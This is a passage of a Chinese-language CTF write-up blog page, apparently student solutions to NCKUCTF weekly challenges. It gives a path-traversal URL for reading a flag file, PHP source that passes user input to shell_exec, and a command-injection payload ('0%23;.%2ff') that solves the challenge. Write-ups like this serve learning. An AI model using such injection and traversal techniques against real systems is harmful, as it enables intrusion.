+    http://chall.nckuctf.org:29202/img/Ly9mbGFn</a>
+最後再把網站Ctrl+s存下來，在原本的網站讀不出來得原因是因為他不是圖片檔，存成txt之類的就可以了</p>
+</blockquote>
+<p>flag: NCKUCTF{os.path.join can join to root}</p>
+
+
+<h3 class="relative group">Misc / Double Exploit 
+    <div id="misc--double-exploit" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#misc--double-exploit" aria-label="定位點">#</a>
+    </span>        
+    
+</h3>
+<p>很酷的一題，現在才知道原來這些東西都可以撈，喵<br>
+原始碼如下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">require</span> <span class="s2">&#34;secret.php&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;payload&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$payload</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;payload&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$payload</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">6</span><span class="p">)</span> <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Bad bad cat&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$result</span><span class="o">=</span><span class="nx">shell_exec</span><span class="p">(</span><span class="s2">&#34;./pwn_me &#34;</span><span class="o">.</span><span class="nv">$payload</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="o">==</span><span class="s2">&#34;Meowing Whale&#34;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="s2">&#34;index.php&#34;</span><span class="p">);</span>
+</span></span></code></pre></div><p>先查看題目會發現，payload的部分只能輸入6個字元、  最後的result要為&quot;Meowing Whale&quot;<br>
+首先能透過<code>http://chall.nckuctf.org:29205/pwn_me</code>，來下載pwn_me去做分析<br>
+透過IDA查看後會發現，輸入的第二字元為<code>#</code>則會輸出我們要的Meowing<br>
+再來透過存取<code>http://chall.nckuctf.org:29205/Dockerfile</code>，可以發現還可以存取一個叫<code>f</code>的檔案，一樣把它下載下來，發現執行後就會輸出Whale<br>
+<img src="image.png"  />
+東西都找到了，最後就把它們串在一起就可以了 <code>payload=0%23;.%2ff</code><br>
+不知道為甚麼payload直接送 <code>0#;./f</code> 會失敗，要變成送url編碼後的形式才可以</p>
+<p>flag: NCKUCTF{my_first_pwn+web+rev_XD}</p>
+
+
+<h2 class="relative group">總結 
+    <div id="%E7%B8%BD%E7%B5%90" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E7%B8%BD%E7%B5%90" aria-label="定位點">#</a>
+    </span>        
+    
+</h2>
+<p>耶寫完了 排版一樣很醜<br>
+這次好廢喔 明年還打 好打一直打</p>
+
+        </div>
+        
+        
+
+        
+        
+
+          
+      </div>
+     
+      
+      
+        
+        
+          
+          
+        
+      <script>
+        var oid = "views_posts\\009_WeeklyCTF04\\index.md"
+        var oid_likes = "likes_posts\\009_WeeklyCTF04\\index.md"
+      </script>
+      
+      
+      
+      <script type="text/javascript" src="/js/page.min.0860cf4e04fa2d72cc33ddba263083464d48f67de06114529043cb4623319efed4f484fd7f1730df5abea0e2da6f3538855634081d02f2d6e920b956f063e823.js" integrity="sha512-CGDPTgT6LXLMM926JjCDRk1I9n3gYRRSkEPLRiMxnv7U9IT9fxcw31q&#43;oOLabzU4hVY0CB0C8tbpILlW8GPoIw=="></script>
+  
+    </section>
+  <footer class="pt-8 max-w-prose print:hidden">
+
+    
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="flex group mr-3" href="/posts/008_weeklyctf03/">
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >每周CTF計畫03</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2024-10-10 00:00:00 &#43;0000 UTC">10 October 2024</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+    
+  </footer>
+</article>
+
+      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="捲動到頁頂" title="捲動到頁頂">
+    &uarr;
+  </a>
+</div>
+    </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+  
+  <div class="flex items-center justify-between">
+
+    
+    
+    <p class="text-sm text-neutral-500 dark:text-neutral-400">
+      &copy;
+      2024
+      貝坦betan
+    </p>
+    
+
+    
+    
+
+  </div>
+  <script>
+    
+    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+      margin: 24,
+      background: 'rgba(0,0,0,0.5)',
+      scrollOffset: 0,
+    })
+    
+  </script>
+  
+  
+  <script type="text/javascript" src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js" integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
+  
+  
+</footer><div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
+  data-url="https://betan423.github.io/"
+  style="z-index:500"
+>
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
+  >
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="搜尋"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="關閉 (Esc)"
+      >
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+  </div>
+</body>
+
+</html>
